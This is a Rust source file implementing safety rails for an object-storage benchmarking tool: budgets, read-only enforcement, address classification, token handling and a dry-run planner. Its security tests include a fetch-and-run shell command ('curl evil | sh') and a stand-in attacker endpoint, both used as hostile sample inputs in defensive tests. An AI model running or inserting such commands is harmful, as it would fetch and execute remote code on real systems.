//! Safety rails (design §10): live budgets, the `--dry-run` plan, `--read-only`, deterministic
//! run prefixes and the preflight check that runs before anything is written.
//!
//! Budgets are enforced by the engine: the recorder feeds every completed operation's requests
//! and bytes to [`Guard::add`] (all phases), the runner's sampler calls [`Guard::tick`]; the
//! first breach cancels the run, and the command fails with `safety.budget_exceeded` (exit 4).

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

use crate::config::{OpKind, Profile};
use crate::engine::Cancel;
use crate::errors::{ErrorCode, OprobeError};

/// Limits for one command.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct Budgets {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_cost_usd: Option<f64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_requests_count: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_bytes: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub max_duration_s: Option<f64>,
}

impl Budgets {
    /// The budgets of every run an MCP server starts unless its own flags set others (design
    /// v5 §5, S6): 50 000 requests, 2 minutes, $1 and 5 GiB. A tool call can only lower them.
    pub fn mcp_default() -> Self {
        Self {
            max_cost_usd: Some(1.0),
            max_requests_count: Some(50_000),
            max_bytes: Some(5 << 30),
            max_duration_s: Some(120.0),
        }
    }

    /// Every limit `self` leaves unset taken from `defaults`.
    pub fn or(self, defaults: &Budgets) -> Self {
        Self {
            max_cost_usd: self.max_cost_usd.or(defaults.max_cost_usd),
            max_requests_count: self.max_requests_count.or(defaults.max_requests_count),
            max_bytes: self.max_bytes.or(defaults.max_bytes),
            max_duration_s: self.max_duration_s.or(defaults.max_duration_s),
        }
    }

    pub fn is_empty(&self) -> bool {
        self.max_cost_usd.is_none()
            && self.max_requests_count.is_none()
            && self.max_bytes.is_none()
            && self.max_duration_s.is_none()
    }
}

/// Which budget stopped the run.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct BudgetBreach {
    /// `requests`, `bytes`, `duration` or `cost`.
    pub budget: String,
    pub limit: f64,
    pub observed: f64,
}

impl BudgetBreach {
    pub fn message(&self) -> String {
        match self.budget.as_str() {
            "requests" => format!(
                "request budget exceeded: {} requests (limit {})",
                self.observed, self.limit
            ),
            "bytes" => format!(
                "byte budget exceeded: {} transferred (limit {})",
                crate::util::fmt_bytes(self.observed as u64),
                crate::util::fmt_bytes(self.limit as u64)
            ),
            "duration" => format!(
                "duration budget exceeded: {:.1}s (limit {:.1}s)",
                self.observed, self.limit
            ),
            _ => format!(
                "cost budget exceeded: ~${:.4} (limit ${:.4})",
                self.observed, self.limit
            ),
        }
    }

    pub fn to_error(&self) -> anyhow::Error {
        OprobeError::new(ErrorCode::SafetyBudgetExceeded, self.message())
            .with_hint("raise the budget (--max-requests, --max-bytes, --max-duration, --max-cost-usd) or shorten the run")
            .into()
    }
}

/// Live budget enforcement shared by the recorder and the runner.
#[derive(Debug)]
pub struct Guard {
    budgets: Budgets,
    /// Estimated USD per request (conservative: the write-class price) where cost applies.
    usd_per_request: Option<f64>,
    started: Instant,
    requests: AtomicU64,
    bytes: AtomicU64,
    breach: Mutex<Option<BudgetBreach>>,
    tripped: std::sync::atomic::AtomicBool,
    /// The measurement currently enforced (re-armed by each session sharing this guard).
    cancel: Mutex<Option<Cancel>>,
}

impl oprobe_trace::Budget for Guard {
    fn add(&self, requests: u64, bytes: u64) {
        Guard::add(self, requests, bytes);
    }
}

impl Guard {
    pub fn new(budgets: Budgets) -> Arc<Self> {
        Arc::new(Self {
            budgets,
            usd_per_request: None,
            started: Instant::now(),
            requests: AtomicU64::new(0),
            bytes: AtomicU64::new(0),
            breach: Mutex::new(None),
            tripped: std::sync::atomic::AtomicBool::new(false),
            cancel: Mutex::new(None),
        })
    }

    /// A guard whose cost budget uses `usd_per_request`.
    pub fn with_pricing(budgets: Budgets, usd_per_request: Option<f64>) -> Arc<Self> {
        let mut g = Self::new(budgets);
        Arc::get_mut(&mut g).expect("fresh").usd_per_request = usd_per_request;
        g
    }

    pub fn budgets(&self) -> &Budgets {
        &self.budgets
    }

    /// Cancel `cancel` when a budget is exceeded. A guard shared by several measurements
    /// (one aggregate budget for `run --repeat`, `matrix`) is re-armed by each of them; a
    /// guard that has already tripped cancels at once.
    pub fn arm(&self, cancel: Cancel) {
        if self.tripped() {
            cancel.cancel();
        }
        *self.cancel.lock().unwrap_or_else(|e| e.into_inner()) = Some(cancel);
    }

    /// Account requests and bytes (hot path: two atomic adds and a few compares).
    #[inline]
    pub fn add(&self, requests: u64, bytes: u64) {
        let r = self.requests.fetch_add(requests, Ordering::Relaxed) + requests;
        let b = self.bytes.fetch_add(bytes, Ordering::Relaxed) + bytes;
        if let Some(max) = self.budgets.max_requests_count
            && r > max
        {
            self.trip("requests", max as f64, r as f64);
        }
        if let Some(max) = self.budgets.max_bytes
            && b > max
        {
            self.trip("bytes", max as f64, b as f64);
        }
        if let (Some(max), Some(p)) = (self.budgets.max_cost_usd, self.usd_per_request) {
            let usd = r as f64 * p;
            if usd > max {
                self.trip("cost", max, usd);
            }
        }
        self.tick();
    }

    /// Check the wall-clock budget.
    #[inline]
    pub fn tick(&self) {
        if let Some(max) = self.budgets.max_duration_s {
            let s = self.started.elapsed().as_secs_f64();
            if s > max {
                self.trip("duration", max, s);
            }
        }
    }

    fn trip(&self, budget: &str, limit: f64, observed: f64) {
        if self.tripped.swap(true, Ordering::AcqRel) {
            return;
        }
        *self.breach.lock().unwrap_or_else(|e| e.into_inner()) = Some(BudgetBreach {
            budget: budget.to_owned(),
            limit,
            observed,
        });
        if let Some(c) = self
            .cancel
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .as_ref()
        {
            c.cancel();
        }
    }

    pub fn tripped(&self) -> bool {
        self.tripped.load(Ordering::Acquire)
    }

    pub fn breach(&self) -> Option<BudgetBreach> {
        self.breach
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .clone()
    }

    /// Requests and bytes accounted so far.
    pub fn usage(&self) -> (u64, u64) {
        (
            self.requests.load(Ordering::Relaxed),
            self.bytes.load(Ordering::Relaxed),
        )
    }

    /// Time until the duration budget runs out.
    pub fn remaining_time(&self) -> Option<Duration> {
        self.budgets
            .max_duration_s
            .map(|m| Duration::from_secs_f64(m).saturating_sub(self.started.elapsed()))
    }
}

/// Estimated USD per request for a target (write-class list price, conservative), when a
/// price table applies.
pub fn usd_per_request(profile: &Profile) -> Option<f64> {
    let t = &profile.target;
    let key = profile.cost.provider.clone().or_else(|| {
        crate::analysis::cost::detect_provider(&t.scheme, t.endpoint().as_deref())
            .map(str::to_owned)
    })?;
    let p = profile
        .cost
        .pricing
        .clone()
        .or_else(|| crate::analysis::cost::preset(&key))?;
    Some(p.write_per_million.max(p.read_per_million) / 1e6)
}

/// Targets that live in this process: `memory://` and the in-process `lab://` S3 server.
/// Writing to them touches nothing outside the process, so a read-only MCP server allows it
/// (design v4 §9, AG-2).
///
/// A `lab://` target counts only while it still points at a loopback address without an egress
/// proxy: an `endpoint` or `proxy` override would send its requests elsewhere (design v5 §5).
pub fn in_process(t: &crate::config::TargetSpec) -> bool {
    if t.scheme == "memory" {
        return true;
    }
    let lab = t
        .url
        .as_deref()
        .is_some_and(|u| u.trim().to_ascii_lowercase().starts_with("lab://"));
    if !lab {
        return false;
    }
    let proxied = t
        .proxy
        .as_deref()
        .is_some_and(|p| !p.trim().is_empty() && !p.trim().eq_ignore_ascii_case("none"));
    let loopback = t
        .options
        .get("endpoint")
        .is_none_or(|e| endpoint_host(e).is_some_and(|h| host_is_loopback(&h)));
    loopback && !proxied
}

/// The host of an `http(s)://host[:port]/…` endpoint (brackets of an IPv6 literal removed).
pub fn endpoint_host(endpoint: &str) -> Option<String> {
    let u = url::Url::parse(endpoint.trim()).ok()?;
    let h = u.host_str()?;
    Some(h.trim_matches(['[', ']']).to_ascii_lowercase())
}

fn host_is_loopback(host: &str) -> bool {
    host == "localhost"
        || host
            .parse::<std::net::IpAddr>()
            .is_ok_and(|ip| address_class(ip) == AddressClass::Loopback)
}

/// A run request from an untrusted source (an MCP call, a deserialized document): only the
/// in-process OpenDAL client in this process. `client: exec` spawns a command and `workers`
/// sends the workload (and credentials) to other machines, so neither may come from outside
/// a person's own flags (design v5 §5, §7, §8). Returns what was reset.
pub fn reset_untrusted_load(req: &mut crate::app::RunRequest) -> Vec<&'static str> {
    let mut reset = Vec::new();
    if req.client != crate::app::ClientChoice::Opendal {
        req.client = crate::app::ClientChoice::Opendal;
        reset.push("client");
    }
    if req.workers.take().is_some() {
        reset.push("workers");
    }
    reset
}

/// Refuse to replay a stored run that used another load generator or remote workers: an
/// untrusted caller must not re-launch its command or reach its workers.
pub fn refuse_foreign_load(report: &crate::model::Report) -> anyhow::Result<()> {
    let kind = report.client.kind.as_str();
    if !(kind.is_empty() || kind == "opendal") || !report.workers.is_empty() {
        return Err(OprobeError::new(
            ErrorCode::SafetyRefused,
            format!(
                "run `{}` used the `{kind}` client{}: an MCP call cannot replay it",
                report.run.id,
                if report.workers.is_empty() {
                    ""
                } else {
                    " and remote workers"
                }
            ),
        )
        .with_hint("replay it from the CLI, where the client and workers are your own flags")
        .into());
    }
    Ok(())
}

/// A fresh random bearer token: 32 bytes from the OS-seeded CSPRNG, hex encoded (64 chars).
pub fn random_token() -> String {
    use rand::RngCore;
    let mut b = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut b);
    b.iter().map(|x| format!("{x:02x}")).collect()
}

/// Compare a presented secret with the expected one in time independent of where they differ
/// (the length is not secret: tokens have a fixed length).
pub fn secrets_equal(given: &[u8], expected: &[u8]) -> bool {
    if given.len() != expected.len() {
        return false;
    }
    let mut diff = 0u8;
    for (a, b) in given.iter().zip(expected) {
        diff |= a ^ b;
    }
    // Keep the optimiser from short-circuiting the loop.
    std::hint::black_box(diff) == 0
}

/// What kind of network an address belongs to (`probe_endpoint`, endpoint overrides and the
/// lab's bind check refuse the non-public ones unless allowed).
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum AddressClass {
    Loopback,
    /// 169.254.0.0/16 and fe80::/10: where cloud metadata services answer.
    LinkLocal,
    /// RFC 1918, carrier-grade NAT (100.64.0.0/10) and unique-local IPv6 (fc00::/7).
    Private,
    /// 0.0.0.0, ::, broadcast, multicast and other reserved ranges.
    Reserved,
    Public,
}

/// Classify `ip` (IPv4-mapped IPv6 addresses as their IPv4 address).
pub fn address_class(ip: std::net::IpAddr) -> AddressClass {
    use std::net::IpAddr;
    let ip = match ip {
        IpAddr::V6(v6) => match v6.to_ipv4_mapped() {
            Some(v4) => IpAddr::V4(v4),
            None => IpAddr::V6(v6),
        },
        v4 => v4,
    };
    match ip {
        IpAddr::V4(a) => {
            let o = a.octets();
            if a.is_loopback() {
                AddressClass::Loopback
            } else if a.is_link_local() {
                AddressClass::LinkLocal
            } else if a.is_private() || (o[0] == 100 && (o[1] & 0xc0) == 64) {
                AddressClass::Private
            } else if a.is_unspecified()
                || a.is_broadcast()
                || a.is_multicast()
                || o[0] == 0
                || o[0] >= 240
            {
                AddressClass::Reserved
            } else {
                AddressClass::Public
            }
        }
        IpAddr::V6(a) => {
            let seg = a.segments();
            if a.is_loopback() {
                AddressClass::Loopback
            } else if (seg[0] & 0xffc0) == 0xfe80 {
                AddressClass::LinkLocal
            } else if (seg[0] & 0xfe00) == 0xfc00 {
                AddressClass::Private
            } else if a.is_unspecified() || a.is_multicast() {
                AddressClass::Reserved
            } else {
                AddressClass::Public
            }
        }
    }
}

/// Resolve `host:port` and classify every address it resolves to.
pub async fn resolve_classes(
    host: &str,
    port: u16,
) -> anyhow::Result<Vec<(std::net::IpAddr, AddressClass)>> {
    let addrs = tokio::net::lookup_host((host, port)).await.map_err(|e| {
        OprobeError::new(ErrorCode::NetDns, format!("cannot resolve `{host}`: {e}"))
    })?;
    Ok(addrs.map(|a| (a.ip(), address_class(a.ip()))).collect())
}

/// Set (to `1`) by a read-only MCP server on the commands it runs as children (`fix`,
/// `verify`, …): they then refuse any measurement that would write to a target outside their
/// own process, whatever their arguments say ([`check_server_read_only`]).
pub const READ_ONLY_SERVER_ENV: &str = "OPROBE_MCP_READ_ONLY";

/// The rail of [`READ_ONLY_SERVER_ENV`]: refuse a run of `profile` that would write, unless
/// its target lives in this process.
pub fn check_server_read_only(profile: &Profile) -> anyhow::Result<()> {
    let on = std::env::var(READ_ONLY_SERVER_ENV).is_ok_and(|v| !v.is_empty() && v != "0");
    if !on {
        return Ok(());
    }
    refuse_server_writes(profile)
}

/// A read-only MCP server's rail (`Safety::allow_write == false`): refuse a run of `profile`
/// that would write, unless its target lives in this process.
pub fn refuse_server_writes(profile: &Profile) -> anyhow::Result<()> {
    if in_process(&profile.target) {
        return Ok(());
    }
    check_read_only(profile).map_err(|_| {
        OprobeError::new(
            ErrorCode::SafetyReadOnly,
            format!(
                "the MCP server that started this command is read-only: refusing a run that would write to {}",
                profile.target.display()
            ),
        )
        .with_hint("benchmark existing objects with `existing: PREFIX`, or restart the server with `oprobe mcp --allow-write`")
        .into()
    })
}

/// `--read-only` (implied by `--existing`): refuse a run that would write or delete.
pub fn check_read_only(profile: &Profile) -> anyhow::Result<()> {
    let ds = profile.workload.effective_dataset();
    if ds.existing_prefix.is_some() {
        // Write operations are removed from the mix of an existing dataset; nothing is written.
        return Ok(());
    }
    let mix = profile.workload.effective_mix();
    let writes = mix.iter().any(|m| m.weight > 0 && m.op.is_write());
    let needs_dataset = mix.iter().any(|m| m.weight > 0 && !m.op.is_write());
    let what = match (needs_dataset, writes) {
        (true, true) => "it would upload a test dataset and run write operations",
        (true, false) => "it would upload a test dataset",
        (false, true) => "its workload writes objects",
        (false, false) => return Ok(()),
    };
    Err(OprobeError::new(
        ErrorCode::SafetyReadOnly,
        format!("read-only: refusing the run, {what}"),
    )
    .with_hint("benchmark existing objects with `--existing PREFIX`, or drop `--read-only`")
    .into())
}

/// What a run would do (`--dry-run`).
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct Plan {
    pub target: String,
    pub preset: String,
    pub run_prefix: String,
    pub read_only: bool,
    pub concurrency_count: u64,
    pub warmup_s: f64,
    pub duration_s: f64,
    /// Estimated logical operations (warmup + window).
    pub estimated_ops_count: u64,
    /// Estimated backend requests (dataset upload + workload + cleanup).
    pub estimated_requests_count: u64,
    /// Estimated bytes transferred (up + down).
    pub estimated_bytes: u64,
    pub objects_written_count: u64,
    pub objects_deleted_count: u64,
    /// Request cost at list prices, where a price table applies.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub estimated_cost_usd: Option<f64>,
    /// Estimated wall time, dataset upload and cleanup included.
    pub eta_s: f64,
    pub budgets: Budgets,
    /// How the estimates were made.
    pub assumptions: Vec<String>,
    /// The target as given (URL or `lab://` scenario), for the run command.
    #[serde(default)]
    pub target_ref: String,
    /// The command that runs this plan (`oprobe run …`, every non-default setting).
    #[serde(default)]
    pub command: String,
    /// Things that would run, but probably not as meant (e.g. warmup ≥ window).
    #[serde(default)]
    pub warnings: Vec<String>,
}

/// Build the plan of a run without touching the target.
pub fn plan(profile: &Profile, run_prefix: &str, read_only: bool, budgets: &Budgets) -> Plan {
    let w = &profile.workload;
    let k = &profile.knobs;
    let ds = w.effective_dataset();
    let mut mix = w.effective_mix();
    if ds.existing_prefix.is_some() {
        mix.retain(|m| !m.op.is_write());
    }
    let network = profile.target.is_network();
    let total_w: u64 = mix.iter().map(|m| m.weight as u64).sum::<u64>().max(1);
    let chunk = k.chunk_size.0.max(1);
    let obj = ds.object_size.0;
    // Requests and bytes of one operation of each kind.
    let per_op = |op: &OpKind| -> (f64, f64, bool) {
        match op {
            OpKind::Read { size } => {
                let len = size.map(|s| s.0.min(obj)).unwrap_or(obj);
                (len.div_ceil(chunk).max(1) as f64, len as f64, false)
            }
            OpKind::ParquetScan {
                columns,
                column_size,
                footer_size,
                suffix,
            } => (
                if *suffix { 1.0 } else { 2.0 } + *columns as f64,
                footer_size.0 as f64 + *columns as f64 * column_size.0 as f64,
                false,
            ),
            OpKind::Write { size } => (1.0, size.0 as f64, true),
            OpKind::MultipartWrite { size } => {
                let parts = size.0.div_ceil(chunk).max(1);
                (
                    if parts > 1 { parts as f64 + 2.0 } else { 1.0 },
                    size.0 as f64,
                    true,
                )
            }
            OpKind::Stat => (1.0, 0.0, false),
            OpKind::List { .. } => (1.0, 4096.0, false),
            OpKind::ListPaged { limit } => {
                let per_part = (ds.objects / ds.partitions.max(1)).max(1) as f64;
                (
                    (per_part / (*limit).max(1) as f64).ceil().max(1.0),
                    4096.0,
                    false,
                )
            }
            // One batch request (or one request per key where the service has no batches).
            OpKind::Delete { .. } => (1.0, 0.0, true),
            OpKind::Copy => (1.0, 0.0, true),
            OpKind::PresignedRead => (1.0, obj as f64, false),
            OpKind::ConditionalWrite { size } => (1.0, size.0 as f64, true),
            OpKind::MetadataWrite { size, .. } => (1.0, size.0 as f64, true),
        }
    };
    let (mut req_per_op, mut bytes_per_op, mut write_share) = (0.0, 0.0, 0.0);
    for m in &mix {
        let f = m.weight as f64 / total_w as f64;
        let (r, b, wr) = per_op(&m.op);
        req_per_op += f * r;
        bytes_per_op += f * b;
        if wr {
            write_share += f;
        }
    }
    let mut assumptions = Vec::new();
    let op_latency_s = if network {
        let transfer = bytes_per_op / (100.0 * 1024.0 * 1024.0);
        assumptions.push(
            "network operations take ~30 ms plus transfer at 100 MiB/s per operation".to_owned(),
        );
        0.030 + transfer
    } else {
        assumptions.push("in-process operations take ~0.2 ms".to_owned());
        0.0002
    };
    let window = w.warmup.get().as_secs_f64() + w.duration.get().as_secs_f64();
    let conc = k.concurrency.max(1) as f64;
    let mut ops = match w.rate {
        Some(rate) => rate * window,
        None => conc * window / op_latency_s,
    };
    if let Some(m) = w.max_ops {
        ops = ops.min(m as f64 + conc * w.warmup.get().as_secs_f64() / op_latency_s);
    }
    let ops = ops.max(0.0).round() as u64;

    let needs_dataset = ds.existing_prefix.is_none() && mix.iter().any(|m| !m.op.is_write());
    let dataset_objects = if needs_dataset { ds.objects as u64 } else { 0 };
    let dataset_bytes = dataset_objects * obj;
    let dataset_requests = dataset_objects * obj.div_ceil(8 * 1024 * 1024).max(1);
    let scratch = if write_share > 0.0 {
        ((ops as f64 * write_share) as u64).min(k.concurrency as u64 * 4)
    } else {
        0
    };
    let written = dataset_objects + scratch;
    let deleted = if w.cleanup && ds.existing_prefix.is_none() && !ds.persist {
        written
    } else {
        scratch
    };
    let cleanup_requests = if written > 0 {
        2 + deleted.div_ceil(1000)
    } else {
        0
    };
    let requests = dataset_requests + (ops as f64 * req_per_op).round() as u64 + cleanup_requests;
    let bytes = dataset_bytes + (ops as f64 * bytes_per_op).round() as u64;
    let prepare_s = if network {
        dataset_bytes as f64 / (50.0 * 1024.0 * 1024.0) + dataset_objects as f64 * 0.01
    } else {
        dataset_bytes as f64 / (1024.0 * 1024.0 * 1024.0)
    };
    if needs_dataset && network {
        assumptions.push("the dataset uploads at ~50 MiB/s".to_owned());
    }
    let cleanup_s = if network {
        cleanup_requests as f64 * 0.1
    } else {
        0.0
    };
    Plan {
        target: profile.target.display(),
        preset: w.preset.slug().to_owned(),
        run_prefix: run_prefix.to_owned(),
        read_only,
        concurrency_count: k.concurrency as u64,
        warmup_s: w.warmup.get().as_secs_f64(),
        duration_s: w.duration.get().as_secs_f64(),
        estimated_ops_count: ops,
        estimated_requests_count: requests,
        estimated_bytes: bytes,
        objects_written_count: written,
        objects_deleted_count: deleted,
        estimated_cost_usd: usd_per_request(profile).map(|p| p * requests as f64),
        eta_s: prepare_s + window + cleanup_s,
        budgets: budgets.clone(),
        assumptions,
        target_ref: target_ref(profile),
        command: crate::model::RunSpec::new(profile, target_ref(profile)).command(),
        warnings: workload_warnings(profile),
    }
}

/// The target of a profile as typed: its URL (or `lab://` scenario) without secrets, else its
/// display form.
pub fn target_ref(profile: &Profile) -> String {
    profile
        .target
        .url
        .as_deref()
        .map(crate::util::redact_url)
        .unwrap_or_else(|| profile.target.display())
}

/// Warnings about a workload that would run but probably not as meant (AG-9): a warmup at
/// least as long as the measurement window spends most of the run unmeasured.
pub fn workload_warnings(profile: &Profile) -> Vec<String> {
    let w = &profile.workload;
    let (warmup, window) = (w.warmup.get(), w.duration.get());
    let mut out = Vec::new();
    if !warmup.is_zero() && warmup >= window && w.max_ops.is_none() {
        out.push(format!(
            "the warmup ({}) is as long as the measurement window ({}) or longer: most of the \
             run is not measured (shorten --warmup or lengthen -d)",
            w.warmup, w.duration
        ));
    }
    out
}

/// Outcome of [`preflight`].
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
pub struct Preflight {
    /// Listing the target root worked.
    pub list: bool,
    /// A tiny object could be written and deleted under the run prefix.
    pub write_delete: Option<bool>,
}

/// Credentials and permissions, before any write: list the root, then (when the run writes)
/// write and delete a 1-byte object under the run prefix. Fails fast with a classified error.
pub async fn preflight(
    admin: &opendal::Operator,
    run_prefix: &str,
    write_probe: bool,
) -> anyhow::Result<Preflight> {
    let classify = |what: &str, e: opendal::Error| -> anyhow::Error {
        // Typed from the OpenDAL error (a credential that cannot be loaded is
        // `auth.no_credentials`).
        // An error that says nothing more than "unexpected" is a failing service or network
        // path when OpenDAL marks it temporary.
        let code = crate::errors::opendal_code(&e).unwrap_or(if e.is_temporary() {
            ErrorCode::NetUnreachable
        } else {
            ErrorCode::Internal
        });
        let hint = if code == ErrorCode::AuthNoCredentials {
            "no credentials were found: set them for the target (`oprobe doctor TARGET` shows which sources it tried), or pass --anonymous for a public bucket"
        } else {
            "check credentials and permissions with `oprobe doctor TARGET`"
        };
        OprobeError::new(code, format!("preflight: cannot {what}: {e}"))
            .with_hint(hint)
            .into()
    };
    let mut out = Preflight::default();
    admin
        .list_with("")
        .limit(1)
        .await
        .map_err(|e| classify("list the target", e))?;
    out.list = true;
    if write_probe {
        let key = format!("{run_prefix}.oprobe-preflight");
        admin
            .write(&key, vec![0u8])
            .await
            .map_err(|e| classify("write a test object", e))?;
        admin
            .delete(&key)
            .await
            .map_err(|e| classify("delete a test object", e))?;
        out.write_delete = Some(true);
    }
    Ok(out)
}

#[cfg(test)]
mod sec_tests {
    use super::*;

    #[test]
    fn addresses_are_classified() {
        let c = |s: &str| address_class(s.parse().unwrap());
        assert_eq!(c("127.0.0.1"), AddressClass::Loopback);
        assert_eq!(c("::1"), AddressClass::Loopback);
        assert_eq!(c("169.254.169.254"), AddressClass::LinkLocal);
        assert_eq!(c("fe80::1"), AddressClass::LinkLocal);
        assert_eq!(c("::ffff:169.254.169.254"), AddressClass::LinkLocal);
        assert_eq!(c("10.1.2.3"), AddressClass::Private);
        assert_eq!(c("172.16.0.1"), AddressClass::Private);
        assert_eq!(c("192.168.1.1"), AddressClass::Private);
        assert_eq!(c("100.64.0.1"), AddressClass::Private);
        assert_eq!(c("fd00::1"), AddressClass::Private);
        assert_eq!(c("0.0.0.0"), AddressClass::Reserved);
        assert_eq!(c("::"), AddressClass::Reserved);
        assert_eq!(c("8.8.8.8"), AddressClass::Public);
        assert_eq!(c("2606:4700::1111"), AddressClass::Public);
    }

    #[test]
    fn untrusted_run_requests_lose_client_and_workers() {
        let mut r = crate::app::RunRequest::from_spec(Default::default());
        assert!(reset_untrusted_load(&mut r).is_empty());
        r.client = crate::app::ClientChoice::Exec {
            command: "sh -c 'curl evil | sh'".into(),
        };
        r.workers = Some(crate::app::WorkerSet {
            local: Some(4),
            ..Default::default()
        });
        assert_eq!(reset_untrusted_load(&mut r), ["client", "workers"]);
        assert_eq!(r.client, crate::app::ClientChoice::Opendal);
        assert!(r.workers.is_none());
    }

    #[test]
    fn tokens_are_random_and_compared_exactly() {
        let a = random_token();
        let b = random_token();
        assert_eq!(a.len(), 64);
        assert_ne!(a, b);
        assert!(secrets_equal(a.as_bytes(), a.clone().as_bytes()));
        assert!(!secrets_equal(a.as_bytes(), b.as_bytes()));
        assert!(!secrets_equal(&a.as_bytes()[..63], a.as_bytes()));
        assert!(!secrets_equal(b"", a.as_bytes()));
    }

    #[test]
    fn mcp_default_budgets_fill_only_unset_limits() {
        let d = Budgets::mcp_default();
        assert_eq!(d.max_requests_count, Some(50_000));
        assert_eq!(d.max_duration_s, Some(120.0));
        assert_eq!(d.max_cost_usd, Some(1.0));
        assert_eq!(d.max_bytes, Some(5 * 1024 * 1024 * 1024));
        let b = Budgets {
            max_requests_count: Some(1_000_000),
            ..Default::default()
        }
        .or(&d);
        assert_eq!(b.max_requests_count, Some(1_000_000));
        assert_eq!(b.max_duration_s, Some(120.0));
    }

    #[test]
    fn a_lab_target_with_a_foreign_endpoint_is_not_in_process() {
        let mut t = crate::config::TargetSpec {
            url: Some("lab://demo".into()),
            scheme: "s3".into(),
            ..Default::default()
        };
        t.options
            .insert("endpoint".into(), "http://127.0.0.1:9000".into());
        assert!(in_process(&t));
        t.proxy = Some("none".into());
        assert!(in_process(&t));
        t.options
            .insert("endpoint".into(), "https://evil.example.com".into());
        assert!(!in_process(&t));
        t.options
            .insert("endpoint".into(), "http://[::1]:9000".into());
        assert!(in_process(&t));
        t.proxy = Some("http://proxy.example.com:3128".into());
        assert!(!in_process(&t));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn request_budget_trips_once_and_cancels() {
        let g = Guard::new(Budgets {
            max_requests_count: Some(10),
            ..Default::default()
        });
        let c = Cancel::new();
        g.arm(c.clone());
        g.add(10, 0);
        assert!(!g.tripped());
        g.add(1, 0);
        assert!(g.tripped());
        assert!(c.is_cancelled());
        let b = g.breach().unwrap();
        assert_eq!(b.budget, "requests");
        g.add(100, 0);
        assert_eq!(g.breach().unwrap().observed, 11.0);
        let e = b.to_error();
        assert_eq!(
            crate::errors::classify(&e, "s3").code,
            ErrorCode::SafetyBudgetExceeded
        );
    }

    #[test]
    fn a_shared_guard_aggregates_and_rearms() {
        let g = Guard::new(Budgets {
            max_requests_count: Some(10),
            ..Default::default()
        });
        let first = Cancel::new();
        g.arm(first.clone());
        g.add(6, 0);
        let second = Cancel::new();
        g.arm(second.clone());
        g.add(6, 0);
        assert!(g.tripped(), "12 requests over two measurements exceed 10");
        assert!(second.is_cancelled());
        assert!(!first.is_cancelled());
        let third = Cancel::new();
        g.arm(third.clone());
        assert!(
            third.is_cancelled(),
            "a spent budget stops the next measurement"
        );
    }

    #[test]
    fn cost_budget_uses_the_price_per_request() {
        let g = Guard::with_pricing(
            Budgets {
                max_cost_usd: Some(0.01),
                ..Default::default()
            },
            Some(5e-6),
        );
        g.add(2000, 0);
        assert!(!g.tripped());
        g.add(1, 0);
        assert_eq!(g.breach().unwrap().budget, "cost");
    }

    #[test]
    fn read_only_refuses_generated_datasets_but_not_existing_ones() {
        let mut p = Profile::from_target(crate::config::TargetSpec::from_url("memory://").unwrap());
        let e = check_read_only(&p).unwrap_err();
        assert_eq!(
            crate::errors::classify(&e, "memory").code,
            ErrorCode::SafetyReadOnly
        );
        let mut ds = p.workload.effective_dataset();
        ds.existing_prefix = Some("data/".into());
        p.workload.dataset = Some(ds);
        check_read_only(&p).unwrap();
    }

    #[test]
    fn plan_counts_dataset_writes_and_cleanup() {
        let mut p = Profile::from_target(crate::config::TargetSpec::from_url("memory://").unwrap());
        p.workload.max_ops = Some(100);
        p.workload.warmup = crate::util::HumanDuration(Duration::ZERO);
        let pl = plan(&p, "oprobe-run-x/", false, &Budgets::default());
        let ds = p.workload.effective_dataset();
        assert!(pl.objects_written_count >= ds.objects as u64);
        assert_eq!(pl.objects_deleted_count, pl.objects_written_count);
        assert!(pl.estimated_ops_count <= 100);
        assert!(pl.estimated_requests_count >= ds.objects as u64);
        assert!(pl.estimated_cost_usd.is_none(), "memory has no price table");
        assert!(pl.eta_s > 0.0);
    }
}
